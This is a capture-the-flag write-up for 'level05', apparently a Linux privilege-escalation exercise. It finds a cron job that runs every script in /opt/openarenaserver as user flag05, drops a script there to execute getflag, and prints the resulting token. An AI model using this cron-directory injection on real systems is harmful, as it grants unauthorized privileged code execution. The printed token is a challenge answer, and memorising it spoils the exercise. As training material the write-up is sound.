## writeup level05

When we log in as user level05, we are prompted with the message `You have new mail.`. So we look inside the mail folder `/var/mail`.
```shell
$ ls /var/mail
level05
$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
The mail is a crontab executing `/usr/sbin/openarenaserver` as user flag05 every 2 minutes.
We cannot execute this file as user level05, but its a script:
```shell
$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```
We see it execute every file in `/opt/openarenaserver` and delete them. We can guess the crontab is under flag05, so we cannot check if it really exists. \
But to verify it does execute properly, we create a file in `/opt/openarenaserver`. After two minutes, it disappear. To get the flag, we can do:
```shell
$ cat > /opt/openarenaserver/printflag <<EOF
getflag > /tmp/flag
EOF
```
After two minutes, the getflag is executed as user flag05 and redirected to the /tmp/flag
```shell
$ cat /tmp/flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
